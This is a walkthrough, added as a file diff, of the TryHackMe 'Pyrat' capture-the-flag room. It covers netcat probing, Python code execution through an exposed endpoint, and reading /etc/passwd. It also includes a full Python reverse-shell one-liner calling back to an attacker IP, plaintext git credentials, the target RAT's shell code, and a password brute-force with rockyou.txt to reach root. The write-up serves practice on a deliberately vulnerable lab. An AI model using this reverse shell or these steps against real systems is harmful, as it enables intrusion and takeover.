@@ -1,0 +1,106 @@
+Pyrat TryHackMe CTF
+
+https://tryhackme.com/r/room/pyrat
+
+"Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root."
+----------------------------------------------
+
+10.10.95.109
+
+Http page on port 8000 states: 
+
+Try a more basic connection! 
+
+connecting to the server with netcat using the command 'nc -v *IP* *PORT*' gives us:
+
+"Connection to 10.10.95.109 8000 port [tcp/*] succeeded!"
+
+we know that the server is running python as seen in the nmap command, lets try and execute some python code...
+
+and it works.
+
+lets try and execute some system commands
+
+"import subprocess; subprocess.run(["ls", "-la"])"
+
+we dont get any response...
+
+lets try and capture that output and display it...
+
+import subprocess; result = subprocess.run(["ls", "-l", "/home"], capture_output=True); print(result.stdout)
+
+import subprocess; result = subprocess.run(["cat", "/etc/passwd"], capture_output=True); print(result.stdout)
+
+which works!!
+
+import subprocess; result = subprocess.run(["whoami"], capture_output=True); print(result.stdout)
+
+now we know that system commands can be run, lets get a reverse shell
+
+https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python
+
+socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.93.140",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
+
+we have a shell, lets get linpeas from our personal web server.. and run it
+
+mail
+/etc/skel
+/opt/dev/.git
+
+/usr/share/lintian/overrides/passwd
+/usr/share/bash-completion/completions/passwd
+/var/mail/think
+/var/spool/mail/think
+
+
+Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
+
+checking out the .git folder in /opt/dev/.git and in the file 'config' there are some plainsight creds...
+
+[credential "https://github.com"]
+    	username = think
+    	password = _TH1NKINGPirate$_
+
+lets try this password with the user think
+
+and it worked!!!
+
+back to the git directory we recover an old version of the RAT script which explains something to do with endpoints..
+
+...............................................
+
+def switch_case(client_socket, data):
+    if data == 'some_endpoint':
+        get_this_enpoint(client_socket)
+    else:
+        # Check socket is admin and downgrade if is not aprooved
+        uid = os.getuid()
+        if (uid == 0):
+            change_uid()
+
+        if data == 'shell':
+            shell(client_socket)
+        else:
+            exec_python(client_socket, data)
+
+def shell(client_socket):
+    try:
+        import pty
+        os.dup2(client_socket.fileno(), 0)
+        os.dup2(client_socket.fileno(), 1)
+        os.dup2(client_socket.fileno(), 2)
+        pty.spawn("/bin/sh")
+    except Exception as e:
+        send_data(client_socket, e
+
+...............................................
+
+
+after a little guide on scripting with python:
+
+https://www.youtube.com/watch?v=36czawojezg
+
+we created a fuzzing script to find endpoints on the server which discovered a possible endpoint to bruteforce 'admin'
+which asks for a password
+
+after running my script with 'rockyou.txt' we got into the root user!!
